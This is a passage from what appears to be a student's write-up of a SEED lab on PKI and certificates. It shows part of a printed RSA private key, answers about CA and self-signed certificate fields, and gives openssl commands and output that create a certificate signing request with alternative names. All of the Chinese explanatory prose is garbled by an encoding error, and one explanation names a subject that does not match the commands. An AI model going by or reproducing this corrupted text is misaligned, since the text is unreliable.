a6:37:2e:9f:5d:f9:d9:1a:6c:7b:b6:b0:13:35:63:<br>    a7:f0:d3:ac:be:da:ab:c6:19:49:d5:eb:c3:6c:42:<br>    f8:5e:46:96:a7:7e:6f:33:2f:c4:60:20:f2:18:c4:<br>    cc:c6:24:da:bc:6c:19:1c:c7:bf:07:e9:b0:8a:44:<br>    a0:4d:6b:3d:42:84:b6:b6:3b:bc:16:24:0c:79:e8:<br>    0c:0b:77:29:7f:90:0c:e1:e6:2d:a6:d1:3a:41:8e:<br>    f6:f2:b9:74:91:aa:ea:fc:d2:45:2e:ed:46:21:8c:<br>    1c:3b:22:73:75:c7:d1:b6:f1:9f:0d:80:c0:30:af:<br>    58:4d:4d:43:38:5c:36:ff:ba:0a:bc:70:be:12:66:<br>    81:09:68:b2:53:92:f6:3f:1c:25:19:2b:b9:f5:e2:<br>    0e:a8:54:d3:90:73:50:52:6c:d0:96:f3:ce:30:7a:<br>    dd:19<br>prime1:<br>    00:ff:1d:5f:ca:d9:83:4a:b1:26:b2:82:69:0d:77:<br>    2c:c1:ed:99:84:40:22:f0:63:33:e0:ff:94:7f:c0:<br>    2c:aa:41:2f:a9:b7:25:df:06:e2:1d:30:f1:c1:8c:<br>    02:12:0d:38:61:94:f3:de:c8:20:56:0f:a9:ea:61:<br>    82:9b:06:25:8c:38:33:e1:fa:e0:b9:54:76:12:2d:<br>    27:c5:6b:8c:29:c9:ee:06:ed:1f:6b:d0:8a:b2:56:<br>    3f:27:ec:13:bf:58:c7:2c:57:80:56:d7:9c:e2:a2:<br>    e1:e9:73:1b:3e:95:e0:35:7f:c5:4a:20:e7:53:59:<br>    49:b9:85:fe:9e:05:fa:89:f0:5d:35:5a:d1:c3:5a:<br>    1d:d9:6b:a5:3b:2f:11:0b:4b:71:42:6c:7e:df:8b:<br>    4c:d1:38:37:87:b4:99:88:7b:e2:3c:c5:18:f1:7d:<br>    6c:01:b7:9f:39:ab:b0:14:93:fe:4a:d2:a1:37:f5:<br>    11:f4:a7:68:24:a6:1e:96:b6:ed:5d:85:1f:bc:df:<br>    eb:11:a3:1a:8b:98:a9:dc:4a:ab:19:a1:4f:12:02:<br>    cc:35:58:92:ca:5b:e3:e9:f3:7d:cf:25:ac:7a:cb:<br>    ab:46:32:4d:e6:75:01:03:5f:63:cb:1f:96:2d:4e:<br>    ad:a7:48:52:03:4d:83:80:b2:84:58:30:df:bd:59:<br>    22:0d<br>prime2:<br>    00:ec:cd:4c:fd:33:fc:4f:e4:c2:13:df:0a:79:eb:<br>    4a:a1:70:9e:52:c4:bd:74:4f:d9:8d:ff:f2:20:62:<br>    dc:86:09:2f:37:01:39:54:8f:84:02:bf:f3:01:e4:<br>    b4:8e:14:3d:1c:5d:f0:7b:48:11:a1:b6:54:ec:7d:<br>    98:79:a6:23:7b:6d:9e:c0:fa:10:cc:cf:2f:89:11:<br>    08:16:37:c9:7e:8b:1b:d4:71:3e:ae:ba:1d:76:46:<br>    6b:72:25:b5:6e:8c:63:b5:00:5d:6f:8f:c0:00:a8:<br>    76:ce:40:5c:53:ca:2e:ac:c6:9a:84:cc:72:9a:96:<br>    3e:27:3c:cc:3f:41:c2:13:bd:6c:f2:37:cb:c4:e3:<br>    8b:3a:03:a2:bb:ab:e4:8f:53:0f:1a:b3:2a:16:2e:<br>    b3:7f:de:a2:9d:0a:93:77:8e:6c:90:97:cb:7c:9e:<br>    71:e0:4c:56:f7:ae:24:f6:8c:a5:7f:41:96:5c:cd:<br>    4c:c5:dc:8b:54:46:30:10:61:85:5f:e5:a0:7d:78:<br>    fd:fe:90:9a:ec:b1:3f:8c:37:1a:a5:7d:07:75:fe:<br>    41:30:0f:ea:44:db:24:ea:7d:51:f1:c4:1b:40:46:<br>    18:3a:ed:c5:e1:1f:ea:4f:70:f0:84:7c:24:3d:5e:<br>    f6:72:27:ab:10:fb:63:03:1e:e8:55:ad:fa:44:cc:<br>    4b:c7<br>exponent1:<br>    00:ec:dd:a8:20:5e:7e:91:6e:13:e0:f0:46:7b:d3:<br>    28:02:53:0a:13:89:bd:26:f6:e4:a7:46:85:e9:6b:<br>    53:cd:2c:43:05:cf:df:e0:c8:b2:4e:aa:2f:fd:25:<br>    72:92:b2:25:a4:2c:b9:95:22:b9:2b:4e:d5:d3:a1:<br>    7f:b3:52:2c:b0:99:4a:4a:ca:35:b6:bd:9d:f6:d8:<br>    68:31:db:de:42:ba:93:3f:69:10:a0:78:fb:1e:04:<br>    08:15:98:12:e9:b9:93:0c:2f:9e:20:83:86:cd:c2:<br>    b0:00:a1:f8:2c:ce:d9:62:b2:e4:4a:24:6c:c3:ad:<br>    86:4f:34:03:29:53:a1:c0:4b:25:2f:b1:c8:4b:1a:<br>    33:d6:b8:24:ac:e3:d1:6e:6c:38:97:94:c6:e3:e5:<br>    a1:88:2c:2b:1a:db:eb:25:96:e8:82:c5:f9:97:d6:<br>    7c:de:c7:4f:96:2b:3b:8c:8f:b0:2e:66:8c:7b:b9:<br>    16:57:d2:cb:56:23:cb:08:e2:85:57:2c:90:40:3c:<br>    a3:34:37:fd:20:99:b9:34:a9:3b:5d:cb:b0:ef:a7:<br>    1b:55:78:8c:aa:48:51:3f:d9:ec:f8:d5:20:e4:ce:<br>    8f:92:d8:88:0d:ae:9b:27:37:7d:1f:8e:8f:50:37:<br>    d9:f2:14:aa:d9:18:32:3d:df:02:14:24:24:c8:d8:<br>    a6:4d<br>exponent2:<br>    00:c3:db:46:2b:42:9d:14:83:73:56:36:2b:17:0d:<br>    da:2b:4e:d7:54:43:ef:22:cd:8c:76:1b:54:6b:1e:<br>    f9:a0:4e:e6:63:4b:3a:dc:ca:da:f7:df:45:21:b2:<br>    c4:f7:a2:9b:ac:e3:b1:ac:75:be:47:8f:64:0c:3a:<br>    11:2b:c4:93:22:5a:57:6c:eb:27:8c:0e:6d:15:a4:<br>    25:99:22:c9:20:45:f4:5d:b0:d0:94:79:d1:36:6b:<br>    26:21:42:39:1e:d7:34:fc:96:f1:b0:fd:27:64:23:<br>    f2:27:c3:29:da:0f:a6:ad:36:92:c4:f5:c8:70:3d:<br>    85:e8:b4:2b:86:c2:5f:c0:2d:f3:77:1f:59:05:5e:<br>    e2:5f:b8:74:17:5f:23:ea:bb:5b:09:cd:58:29:02:<br>    b5:6a:34:7d:31:00:77:59:f2:4d:af:06:2d:c2:c3:<br>    d6:12:1b:71:ee:e7:75:21:0a:d1:33:40:cf:19:b0:<br>    a0:28:22:b2:86:a0:8a:ce:71:aa:7b:d7:93:f7:53:<br>    64:58:f1:c7:81:af:54:8d:27:62:7d:af:bc:c5:05:<br>    e7:6a:d6:2f:00:86:74:b1:11:b7:fe:0c:22:31:f6:<br>    07:c2:6d:b9:35:eb:4c:c4:29:f8:74:cb:ac:b9:a9:<br>    da:92:2e:67:19:e3:a2:50:09:77:46:ae:60:0a:19:<br>    23:2f<br>coefficient:<br>    18:01:82:8e:84:28:56:0f:0a:ce:25:4c:06:70:53:<br>    3c:ea:55:b3:13:f4:e3:73:21:b0:5d:e5:e4:81:1d:<br>    09:e2:c8:fe:f8:b1:54:75:a0:79:d7:d6:df:2f:86:<br>    98:f0:c7:2d:38:aa:e9:a8:8a:8b:cf:ad:60:bf:b7:<br>    5e:d7:18:96:be:d6:00:cd:8d:06:62:a0:ec:50:1e:<br>    25:26:44:14:33:b5:28:4a:4e:3b:61:c7:86:05:17:<br>    4c:a4:07:70:88:f0:ee:07:79:c1:0a:5e:a8:3c:4d:<br>    41:4b:8b:98:26:d8:7f:12:75:e2:7c:d8:12:97:c6:<br>    22:d6:e1:39:ec:c7:0a:72:17:ca:6e:75:69:b7:79:<br>    4f:ad:65:1b:8b:b6:5d:c3:65:d3:6b:44:9c:cd:37:<br>    c5:79:c4:a8:6f:75:56:b4:92:c9:db:2b:1f:6a:b5:<br>    34:d8:68:6f:cc:c5:b6:96:6b:30:2c:fa:da:34:26:<br>    62:d3:9c:ee:76:e2:f4:2c:ac:c0:33:76:11:01:cc:<br>    10:c9:d3:af:5c:39:03:2a:66:ca:cc:4a:37:63:05:<br>    e6:45:9a:7e:9e:61:b4:b3:9d:90:2b:a4:fa:ef:f1:<br>    64:aa:f0:8a:de:f6:4c:ca:e8:82:29:02:6a:d5:1b:<br>    d3:5e:95:1a:5c:40:0b:03:1a:3e:12:a4:ea:82:9a:<br>    18<br><br></code></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q:"></a>Q:</h2><p>What part of the certificate indicates this is a CAâ€™s certificate? </p><p>åœ¨è¯ä¹¦ä¸­ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºCAè¯ä¹¦å¯ä»¥æŸ¥çœ‹â€Basic Constraintsâ€æ‰©å±•å­—æ®µã€‚åœ¨è¿™ä¸ªè¯ä¹¦ä¸­ï¼Œå­˜åœ¨å¹¶æ ‡è®°ä¸ºå…³é”®çš„â€X509v3 Basic Constraintsâ€æ‰©å±•å­—æ®µã€‚å…¶å–å€¼ä¸ºâ€CA:TRUEâ€ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€å¼ CAè¯ä¹¦ã€‚è¯¥æ‰©å±•å­—æ®µç”¨äºè¯†åˆ«è¯ä¹¦æ˜¯å¦å…·æœ‰ç­¾å‘å…¶ä»–è¯ä¹¦çš„æƒé™ã€‚</p><p>What part of the certificate indicates this is a self-signed certificate? </p><p>è¦åˆ¤æ–­è¯ä¹¦æ˜¯å¦ä¸ºè‡ªç­¾åè¯ä¹¦ï¼Œå¯ä»¥æ¯”è¾ƒä¸»é¢˜å­—æ®µå’Œé¢å‘è€…å­—æ®µã€‚åœ¨è¿™ä¸ªè¯ä¹¦ä¸­ï¼Œä¸»é¢˜å’Œé¢å‘è€…å­—æ®µç›¸åŒï¼šâ€CN = <a href="http://www.modelca.com/">www.modelCA.com</a>, O = Model CA LTD., C = USâ€ã€‚å½“ä¸»é¢˜å’Œé¢å‘è€…å­—æ®µç›¸åŒçš„æ—¶å€™ï¼Œè¡¨æ˜è¯ä¹¦æ˜¯è‡ªç­¾åçš„ã€‚</p><p>In the RSA algorithm, we have a public exponent e, a private exponent d , a modulus n , and two secret numbers p  and q , such that n = p * q . Please identify the values for these elements in your certificate and key files.</p><ul><li>modulusï¼šæ¨¡æ•°ï¼Œç”±ä¸¤ä¸ªç´ æ•°ç›¸ä¹˜å¾—åˆ°</li><li>publicExponentï¼šå…¬å¼€æŒ‡æ•°ï¼Œè¡¨ç¤ºç”¨äºåŠ å¯†çš„å…¬é’¥æŒ‡æ•°ï¼Œè¿™é‡Œæ˜¯65537ã€‚</li><li>privateExponentï¼šç§æœ‰æŒ‡æ•°ï¼Œè¡¨ç¤ºç”¨äºè§£å¯†çš„ç§é’¥æŒ‡æ•°ã€‚</li><li>prime1å’Œprime2ï¼šä¸¤ä¸ªç´ æ•°ï¼Œç”¨äºç”Ÿæˆæ¨¡æ•°ã€‚</li></ul><h1 id="Task-2-Generating-a-Certificate-Request-for-Your-Web-Server"><a href="#Task-2-Generating-a-Certificate-Request-for-Your-Web-Server" class="headerlink" title="Task 2: Generating a Certificate Request for Your Web Server"></a>Task 2: Generating a Certificate Request for Your Web Server</h1><p>ä¸€ä¸ªåä¸ºbank32.comï¼ˆè¯·å°†å…¶æ›¿æ¢ä¸ºæ‚¨è‡ªå·±çš„WebæœåŠ¡å™¨åç§°ï¼‰çš„å…¬å¸å¸Œæœ›ä»æˆ‘ä»¬çš„CAè·å–å…¬é’¥è¯ä¹¦ã€‚é¦–å…ˆï¼Œå®ƒéœ€è¦ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆCSRï¼‰ï¼Œå…¶ä¸­åŒ…æ‹¬å…¬å¸çš„å…¬é’¥å’Œèº«ä»½ä¿¡æ¯ã€‚CSRå°†è¢«å‘é€ç»™CAï¼ŒCAå°†éªŒè¯è¯·æ±‚ä¸­çš„èº«ä»½ä¿¡æ¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªè¯ä¹¦ã€‚ ç”ŸæˆCSRçš„å‘½ä»¤ä¸æˆ‘ä»¬ç”¨äºåˆ›å»ºCAçš„è‡ªç­¾åè¯ä¹¦çš„å‘½ä»¤éå¸¸ç›¸ä¼¼ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯ä½¿ç”¨äº†â€-x509â€é€‰é¡¹ã€‚æ²¡æœ‰è¯¥é€‰é¡¹ï¼Œè¯¥å‘½ä»¤å°†ç”Ÿæˆä¸€ä¸ªè¯·æ±‚ï¼›è€Œä½¿ç”¨è¯¥é€‰é¡¹ï¼Œè¯¥å‘½ä»¤å°†ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ã€‚</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haml">openssl req -newkey rsa:2048 -sha256 \<br>-<span class="ruby">keyout server.key -out server.csr \</span><br><span class="ruby"></span>-<span class="ruby">subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=gls23 Inc./C=US&quot;</span> \</span><br><span class="ruby"></span>-<span class="ruby">passout <span class="hljs-symbol">pass:</span>dees</span><br></code></pre></td></tr></table></figure><ul><li><code>req</code>ï¼šæŒ‡å®šä½¿ç”¨ OpenSSL çš„ req å‘½ä»¤ã€‚</li><li><code>-newkey rsa:2048</code>ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ RSA å¯†é’¥å¯¹ï¼Œå¯†é’¥é•¿åº¦ä¸º 2048 ä½ã€‚</li><li><code>-sha256</code>ï¼šä½¿ç”¨ SHA-256 ç®—æ³•è¿›è¡Œæ‘˜è¦è®¡ç®—ã€‚</li><li><code>-keyout server.key</code>ï¼šå°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ°åä¸º server.key çš„æ–‡ä»¶ä¸­ã€‚</li><li><code>-out server.csr</code>ï¼šå°†ç”Ÿæˆçš„ CSR ä¿å­˜åˆ°åä¸º server.csr çš„æ–‡ä»¶ä¸­ã€‚</li><li><code>-subj &quot;/CN=www.chenyang2022.com/O=Chenyang2022 Inc./C=US&quot;</code>ï¼šè®¾ç½® CSR çš„ä¸»é¢˜ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¸¸ç”¨åç§° (Common Name)ã€ç»„ç»‡åç§° (Organization) å’Œå›½å®¶/åœ°åŒº (Country)ã€‚</li><li><code>-passout pass:dees</code>ï¼šè®¾ç½®ç§é’¥æ–‡ä»¶çš„åŠ å¯†å¯†ç ä¸º â€œdeesâ€ã€‚</li></ul><h2 id="Adding-Alternative-names"><a href="#Adding-Alternative-names" class="headerlink" title="Adding Alternative names"></a>Adding Alternative names</h2><p>æµè§ˆå™¨å®æ–½çš„ä¸»æœºååŒ¹é…ç­–ç•¥è¦æ±‚è¯ä¹¦ä¸­çš„é€šç”¨åç§°å¿…é¡»ä¸æœåŠ¡å™¨çš„ä¸»æœºååŒ¹é…ï¼Œå¦åˆ™æµè§ˆå™¨å°†æ‹’ç»ä¸æœåŠ¡å™¨é€šä¿¡ã€‚ä¸ºäº†å…è®¸ä¸€ä¸ªè¯ä¹¦å…·æœ‰å¤šä¸ªåç§°ï¼ŒX.509 è§„èŒƒå®šä¹‰äº†é™„åŠ åˆ°è¯ä¹¦ä¸Šçš„æ‰©å±•ã€‚è¿™ä¸ªæ‰©å±•ç§°ä¸ºä¸»ä½“å¤‡ç”¨åç§°ï¼ˆSubject Alternative Nameï¼ŒSANï¼‰ã€‚ä½¿ç”¨ SAN æ‰©å±•ï¼Œå¯ä»¥åœ¨è¯ä¹¦çš„ subjectAltName å­—æ®µä¸­æŒ‡å®šå¤šä¸ªä¸»æœºåã€‚ä¸ºäº†ç”Ÿæˆå¸¦æœ‰è¿™æ ·ä¸€ä¸ªå­—æ®µçš„è¯ä¹¦ç­¾åè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰å¿…è¦çš„ä¿¡æ¯æ”¾åœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­æˆ–è€…é€šè¿‡å‘½ä»¤è¡Œæä¾›ã€‚åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å‘½ä»¤è¡Œæ–¹æ³•ï¼ˆé…ç½®æ–‡ä»¶æ–¹æ³•åœ¨å¦ä¸€ä¸ª SEED å®éªŒå®¤ï¼Œå³ TLS å®éªŒå®¤ä¸­ä½¿ç”¨ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥å‘ â€œopenssl reqâ€ å‘½ä»¤æ·»åŠ ä»¥ä¸‹é€‰é¡¹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒsubjectAltName æ‰©å±•å­—æ®µè¿˜å¿…é¡»åŒ…æ‹¬æ¥è‡ªé€šç”¨åç§°å­—æ®µçš„å†…å®¹ï¼›å¦åˆ™ï¼Œé€šç”¨åç§°å°†ä¸è¢«æ¥å—ä¸ºæœ‰æ•ˆåç§°ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">openssl req -newkey rs<span class="hljs-variable">a:2048</span> -<span class="hljs-built_in">sha256</span> \<br>-keyout server.key -out server.csr \<br>-subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=gls23 Inc./C=US&quot;</span> \<br>-passout pas<span class="hljs-variable">s:dees</span> \<br>-addext <span class="hljs-comment">&quot;subjectAltName = DNS:www.gls2023.com, \</span><br>DNS:www.gls2024.<span class="hljs-keyword">com</span><span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[06/21/23]</span>seed<span class="hljs-keyword">@VM</span>:~/demoCA$ openssl req -newkey <span class="hljs-attribute">rsa</span>:<span class="hljs-number">2048</span> -sha256 \<br>&gt; -keyout server.key -out server.csr \<br>&gt; -subj <span class="hljs-string">&quot;/CN=www.gls23.com/O=Bank32 Inc./C=US&quot;</span> \<br>&gt; -passout <span class="hljs-attribute">pass</span>:dees \<br>&gt; -addext <span class="hljs-string">&quot;subjectAltName = DNS:www.gls2023.com, \</span><br><span class="hljs-string">&gt; DNS:www.gls2024.com&quot;</span><br>Generating a RSA private key<br>...................+++++<br>..........................................................................................................................+++++<br>writing new private key to <span class="hljs-string">&#x27;server.key&#x27;</span><br><br>[<span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-keyword">@VM</span>:~/demoCA$ openssl req -in server.csr -text -noout<br>Certificate <span class="hljs-attribute">Request</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">1</span> (<span class="hljs-number">0</span>x0)<br>        <span class="hljs-attribute">Subject</span>: CN = www.gls23.com, O = Bank32 Inc., C = US<br>        Subject Public Key <span class="hljs-attribute">Info</span>:<br>            Public Key <span class="hljs-attribute">Algorithm</span>: rsaEncryption<br>                RSA <span class="hljs-attribute">Public-Key</span>: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-number">00</span>:a4:<span class="hljs-number">10</span>:d3:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">98</span>:<span class="hljs-number">01</span>:<span class="hljs-number">14</span>:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:c1:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">ba</span>:<br>                    <span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">64</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:e2:<span class="hljs-number">35</span>:<span class="hljs-number">27</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">03</span>:c5:c4:f0:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">53</span>:<br>                    f0:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">11</span>:<span class="hljs-number">40</span>:e6:<span class="hljs-attribute">ab</span>:<span class="hljs-attribute">df</span>:e1:<span class="hljs-number">56</span>:d5:a7:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">56</span>:<span class="hljs-number">25</span>:a8:<br>                    <span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">79</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e7:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">98</span>:a9:<span class="hljs-number">96</span>:<span class="hljs-number">26</span>:e0:e2:c5:<span class="hljs-number">93</span>:<br>                    <span class="hljs-attribute">ec</span>:d9:b8:<span class="hljs-attribute">cc</span>:<span class="hljs-number">53</span>:<span class="hljs-number">46</span>:e7:<span class="hljs-number">13</span>:<span class="hljs-number">79</span>:<span class="hljs-number">27</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-attribute">be</span>:<span class="hljs-number">33</span>:b0:d1:<br>                    d0:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:b6:<span class="hljs-number">59</span>:<span class="hljs-number">91</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<span class="hljs-number">48</span>:d8:a8:<span class="hljs-number">66</span>:<span class="hljs-number">57</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:a1:<span class="hljs-attribute">be</span>:<br>                    <span class="hljs-number">82</span>:<span class="hljs-number">61</span>:<span class="hljs-attribute">bb</span>:b5:c4:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">78</span>:d5:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:<span class="hljs-number">56</span>:<span class="hljs-number">51</span>:<span class="hljs-number">43</span>:<span class="hljs-number">78</span>:<span class="hljs-number">95</span>:<br>                    <span class="hljs-number">83</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">91</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">66</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:d4:<span class="hljs-number">26</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">97</span>:<span class="hljs-number">46</span>:e7:<br>                    <span class="hljs-number">57</span>:<span class="hljs-number">03</span>:<span class="hljs-number">10</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">45</span>:<span class="hljs-attribute">bd</span>:b7:<span class="hljs-number">96</span>:<span class="hljs-number">23</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">be</span>:<span class="hljs-number">14</span>:<span class="hljs-number">57</span>:<span class="hljs-number">84</span>:<br>                    c5:<span class="hljs-number">52</span>:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">06</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">55</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">19</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">26</span>:b2:<span class="hljs-attribute">fe</span>:<br>                    <span class="hljs-number">00</span>:<span class="hljs-number">45</span>:e0:<span class="hljs-number">02</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:a5:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">80</span>:<span class="hljs-attribute">df</span>:<span class="hljs-number">73</span>:<span class="hljs-number">55</span>:<span class="hljs-number">65</span>:<span class="hljs-number">84</span>:<span class="hljs-number">28</span>:<br>                    <span class="hljs-number">63</span>:<span class="hljs-number">93</span>:d1:<span class="hljs-number">00</span>:<span class="hljs-number">80</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">52</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:b5:<span class="hljs-number">24</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:e9:a0:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">20</span>:<br>                    <span class="hljs-number">43</span>:<span class="hljs-number">55</span>:e2:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">03</span>:<span class="hljs-number">02</span>:<span class="hljs-number">82</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-number">72</span>:<span class="hljs-number">54</span>:<span class="hljs-number">97</span>:<span class="hljs-number">83</span>:<span class="hljs-attribute">cb</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<br>                    <span class="hljs-number">8</span><span class="hljs-attribute">b</span>:b5:f9:b8:<span class="hljs-number">41</span>:<span class="hljs-number">11</span>:d7:b9:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">51</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-number">73</span>:<br>                    <span class="hljs-number">18</span>:e4:<span class="hljs-number">48</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:c1:<span class="hljs-number">54</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:d0:a0:e7:<span class="hljs-attribute">dc</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">57</span>:<span class="hljs-attribute">fd</span>:<br>                    <span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">48</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:b2:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">74</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">68</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">b</span>:<span class="hljs-number">3</span><span class="hljs-attribute">b</span>:<span class="hljs-number">97</span>:<span class="hljs-attribute">ec</span>:<span class="hljs-attribute">bf</span>:<br>                    <span class="hljs-number">12</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">36</span>:<span class="hljs-number">63</span>:<span class="hljs-number">50</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:e8:<span class="hljs-number">31</span>:<span class="hljs-number">02</span>:d8:e5:d1:e5:<br>                    <span class="hljs-number">2</span><span class="hljs-attribute">f</span>:ed<br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        <span class="hljs-attribute">Attributes</span>:<br>        Requested <span class="hljs-attribute">Extensions</span>:<br>            X509v3 Subject Alternative <span class="hljs-attribute">Name</span>: <br>                <span class="hljs-attribute">DNS</span>:www.gls2023.com, <span class="hljs-attribute">DNS</span>:www.gls2024.com<br>    Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>         <span class="hljs-number">4</span><span class="hljs-attribute">c</span>:f5:d9:b2:f7:<span 